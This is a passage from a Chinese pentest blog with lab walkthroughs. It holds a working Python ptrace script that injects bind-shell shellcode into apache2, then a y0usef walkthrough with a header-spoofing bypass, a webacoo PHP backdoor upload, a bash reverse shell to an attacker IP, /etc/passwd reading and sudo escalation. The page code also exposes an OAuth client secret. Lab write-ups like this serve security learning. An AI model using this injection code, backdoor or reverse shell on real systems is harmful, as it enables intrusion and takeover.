class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span></span><br><span class="line"><span class="comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Macros defined in &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span></span><br><span class="line"> </span><br><span class="line">PTRACE_POKETEXT   = <span class="number">4</span></span><br><span class="line">PTRACE_GETREGS    = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS    = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH     = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH     = <span class="number">17</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Structure defined in &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user_regs_struct</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;r15&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r14&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r13&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r12&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r11&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r10&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r9&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r8&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rip&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;cs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ss&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ds&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;es&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"> </span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"> </span><br><span class="line">pid=<span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Define argument type and respone type.</span></span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Attach to the process</span></span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">registers=user_regs_struct()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Retrieve the value stored in registers</span></span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Injecting Shellcode at: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Shell code copied from exploit db.</span></span><br><span class="line">shellcode=<span class="string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Inject the shellcode into the running process byte by byte.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">4</span>):</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Convert the byte to little endian.</span></span><br><span class="line">  shellcode_byte_int=<span class="built_in">int</span>(shellcode[i:<span class="number">4</span>+i].encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">  shellcode_byte_little_endian=struct.pack(<span class="string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">  shellcode_byte=<span class="built_in">int</span>(shellcode_byte_little_endian,<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Inject the byte.</span></span><br><span class="line">  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode Injected!!&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Modify the instuction pointer</span></span><br><span class="line">registers.rip=registers.rip+<span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Set the registers</span></span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Detach from the process.</span></span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8082/inject.py</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aef | grep &#x27;/usr/sbin/apache2 -k start&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 inject.py 2237</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -pantu | grep 5600</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230721181237670.png" alt="image-20230721181237670"></p>
<h1 id="靶机-y0usef"><a href="#靶机-y0usef" class="headerlink" title="靶机: y0usef"></a>靶机: y0usef</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/shadow-/p/16909038.html" >https://www.cnblogs.com/shadow-/p/16909038.html<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br><span class="line">nmap -A -T4 192.168.56.109</span><br><span class="line">http://192.168.56.109/</span><br></pre></td></tr></table></figure>

<p>我们使用 whatweb 继续探测进行 Web 应用程序指纹识别，看看运行了什么 Web 应用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.56.109</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─#  whatweb http://192.168.56.109</span><br><span class="line">http://192.168.56.109 [200 OK] Apache[2.4.10], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.10 (Ubuntu)], IP[192.168.56.109], JQuery, PHP[5.5.9-1ubuntu4.29], Script, X-Powered-By[PHP/5.5.9-1ubuntu4.29]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.109</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[08:49:16] Starting: </span><br><span class="line">[08:49:30] 301 -  324B  - /adminstration  -&gt;  http://192.168.56.109/adminstration/</span><br><span class="line">[08:49:38] 200 -  791B  - /index.php                                        </span><br><span class="line">[08:49:38] 200 -  791B  - /index.php/login/ </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.109/adminstration/ \</span><br><span class="line">-H &#x27;X-Forwarded-For: 127.0.0.1&#x27;</span><br></pre></td></tr></table></figure>



<p>使用mitmproxy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:</span><br><span class="line">set modify_headers &#x27;/~q/X-Forwarded-For/127.0.0.1&#x27;</span><br><span class="line">ctrl + shift + d</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 Firefox 中设置代理，手动代理 -&gt; HTTP 代理 127.0.0.1 端口 8080</span><br></pre></td></tr></table></figure>

<p>在页面中进行密码猜测，结果 username&#x3D;admin,password&#x3D;admin</p>
<p>利用文件上传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o a.php</span><br></pre></td></tr></table></figure>

<p>文件上传处kali的mitmproxy拦截失败，使用win11的bp来处理</p>
<p>bp增加所有的X-Forwarded-For: 127.0.0.1</p>
<p><img src="/../images/30-pennnnnnnnnnntest/image-20230817140102961.png" alt="image-20230817140102961"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">files/1692252323a.php</span><br></pre></td></tr></table></figure>



<p>既然改了使用bp就得增加一些麻烦的地方</p>
<p><img src="/../images/30-pennnnnnnnnnntest/image-20230817141346027.png" alt="image-20230817141346027"></p>
<p>具体思路是，kali工具webacoo使用proxychains代理到本机的192.168.56.1:8080端口，然后bp开启监听此端口，完成流量的转发，然后bp更改X-Forwarded-For配置，再将流量经过上游代理127.0.0.1:7890到我的clash【可以没有上游】，然后流量访问的是192.168.56.109最终会回到virtualbox的目标靶机，完成操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/proxychains4.conf &gt; proxychains.conf</span><br><span class="line">vim proxychains.conf# 改 socks4 127.0.0.1 9050 --&gt; http 192.168.56.1 8080</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -f proxychains.conf webacoo -t -u http://192.168.56.109/adminstration/upload/files/1692252323a.php</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230817141830194.png" alt="image-20230817141830194"></p>
<p>最终在bp的配合下完成，</p>
<p>接着用webacoo反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch a.sh</span><br><span class="line">echo &#x27;#! /bin/bash\nbash -i &gt;&amp; /dev/tcp/192.168.56.102/7778 0&gt;&amp;1&#x27; &gt; a.sh &amp;&amp; chmod +x ./a.sh</span><br><span class="line">./a.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230817142634880.png" alt="image-20230817142634880"></p>
<p>提权：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">www-data@yousef-VirtualBox:/$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/false</span><br><span class="line">messagebus:x:102:106::/var/run/dbus:/bin/false</span><br><span class="line">usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false</span><br><span class="line">dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false</span><br><span class="line">kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false</span><br><span class="line">rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false</span><br><span class="line">saned:x:108:115::/home/saned:/bin/false</span><br><span class="line">whoopsie:x:109:116::/nonexistent:/bin/false</span><br><span class="line">speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh</span><br><span class="line">avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br><span class="line">lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br><span class="line">hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br><span class="line">yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash</span><br><span class="line">vboxadd:x:999:1::/var/run/vboxadd:/bin/false</span><br><span class="line">guest-cpxNn2:x:116:125:Guest,,,:/tmp/guest-cpxNn2:/bin/bash</span><br><span class="line">sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>

<ul>
<li>发现用户 <code>yousef</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">cat user.txt</span><br><span class="line">echo &#x27;c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=&#x27; | base64 -d</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh yousef@192.168.56.109</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230817143329038.png" alt="image-20230817143329038"></p>
<p>二次提权：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for yousef on yousef-VirtualBox:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User yousef may run the following commands on yousef-VirtualBox:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>

<p>发现此账号可以直接 <code>sudo -s</code> 进入 root</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230817143548630.png" alt="image-20230817143548630"></p>
<p>拿到root shell任务完成！</p>

            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/pentest/">#pentest</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/09/07/31php-python%E7%BB%93%E5%90%88%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">php-python结合的一道题目</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/07/27/27%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">踩坑日记+环境配置</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;Comments
    </div>
    
        
            

    <div class="gitalk-comment-container">
        <div id="gitalk-container"></div>
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
        <script  src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
        <script >
          function loadGitalk() {
            let __gitalk__pathname = decodeURI(location.pathname);
            const __gitalk__pathnameLength = __gitalk__pathname.length;
            const __gitalk__pathnameMaxLength = 50;
            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
            }

            try {
              Gitalk && new Gitalk({
                clientID: 'a415960e8a19902e98bf',
                clientSecret: '97151a67ce9c95ad3c333c402f4cee0f5f05020f',
                repo: 'gitalk',
                owner: 'Lejeremiah',
                admin: 'Lejeremiah',
                id: __gitalk__pathname,
                language: 'en'
              }).render('gitalk-container');
            } catch (e) {
              window.Gitalk = null;
            }
          }

          if ('false' === 'true') {
            const loadGitalkTimeout = setTimeout(() => {
              loadGitalk();
              clearTimeout(loadGitalkTimeout);
            }, 1000);
          } else {
            window.addEventListener('DOMContentLoaded', loadGitalk);
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94"><span class="nav-text">0x00————————————</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00%E2%80%94%E2%80%94%E2%80%94%E2%80%93%E9%9D%B6%E6%9C%BA%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%93"><span class="nav-text">0x00———–靶机————–</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94-1"><span class="nav-text">0x00————————————</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Good%EF%BC%9A"><span class="nav-text">Good：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA-medium-socnet"><span class="nav-text">靶机: medium_socnet</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA-jangow-01"><span class="nav-text">靶机: jangow 01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA-Chronos"><span class="nav-text">靶机: Chronos</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA-EvilBox%E2%80%94One"><span class="nav-text">靶机: EvilBox—One</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E8%B7%AF%E5%BE%84%E5%AD%97%E5%85%B8-file-txt"><span class="nav-text">linux路径字典 file.txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh-dict-txt"><span class="nav-text">ssh_dict.txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="nav-text">提权法一：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA-AdmX-new"><span class="nav-text">靶机: AdmX_new</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA-easy-cloudantivirus"><span class="nav-text">靶机: easy_cloudantivirus</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA-hard-socnet2"><span class="nav-text">靶机: hard_socnet2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA-Hacker-Kid-v1-0-1"><span class="nav-text">靶机: Hacker_Kid-v1.0.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA-y0usef"><span class="nav-text">靶机: y0usef</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2020</span> -
            
            2024
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">jerem1ah</a>
            
        </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>







    
